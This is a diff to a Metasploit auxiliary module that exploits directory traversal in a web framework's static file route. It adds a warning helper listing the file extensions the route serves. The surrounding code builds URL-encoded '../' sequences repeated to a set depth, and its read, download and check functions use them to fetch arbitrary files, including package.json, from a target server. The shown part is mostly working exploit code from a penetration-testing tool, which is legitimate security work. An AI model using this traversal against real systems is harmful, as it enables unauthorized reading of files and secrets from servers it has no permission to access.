@@ -49,6 +49,22 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
+  def check_ext
+    extensions = %w[
+      flac jpg jpeg png gif ico js css txt xml
+      woff woff2 otf ttf eot svg zip rar pdf
+      docx xlsx doc xls html htm appcache
+      manifest map ogv ogg mp4 mp3 webp webm
+      swf package json md m4v jsx heif heic
+    ]
+
+    ext = datastore['FILE'].split('.').last
+
+    unless extensions.include? ext
+      print_warning "Extension #{ext} is not supported by the HTTP static route of the framework"
+    end
+  end
+
   def check
     uri = normalize_uri(target_uri.path) + '%2e%2e%2fpackage.json'
     res = send_request_cgi(
@@ -77,6 +93,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def read
+    check_ext
     traverse = '%2e%2e%2f' * datastore['DEPTH']
     uri = normalize_uri(target_uri.path) + traverse + datastore['FILE']
 
@@ -98,6 +115,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def download
+    check_ext
     traverse = '%2e%2e%2f' * datastore['DEPTH']
     uri = normalize_uri(target_uri.path) + traverse + datastore['FILE']
 
